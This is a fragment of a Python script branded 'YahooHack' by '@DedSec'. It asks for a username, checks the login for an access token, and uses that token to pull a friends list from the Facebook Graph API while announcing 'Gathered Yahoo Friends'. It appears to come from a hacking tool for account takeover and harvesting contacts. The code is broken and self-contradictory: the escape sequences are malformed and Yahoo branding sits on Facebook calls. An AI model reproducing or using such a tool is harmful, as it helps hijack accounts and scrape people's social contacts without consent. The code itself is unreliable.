...
os.system("clear")
print ("\033[39m[\033[31m+\033[39m] Welcome To YahooHack ")
print ("\033[39m[\033[31m+\033[39m] Author : @DedSec")
print ("\033[39m[\033[31m+\033[39m] Youtube : Ded Sec ")
idt = raw_input("\050[Hayy :v Username : ")
...
if 'access_token' in op:
    ...
    print ("\040[40m[\030[31m+\030[31m] Login Success")
else:
    print ("\040[40m[\030[31m+\030[31m] \033[31mLogin Failed!!:v")
    sys.exit()
get_friends = requests.get('https://graph.facebook.com/me/friends?access_token='+token)
hasil = json.loads(get_friends.text)
print ("\033[39m[\033[31m+\033[39m] Gathered Yahoo Friends..")
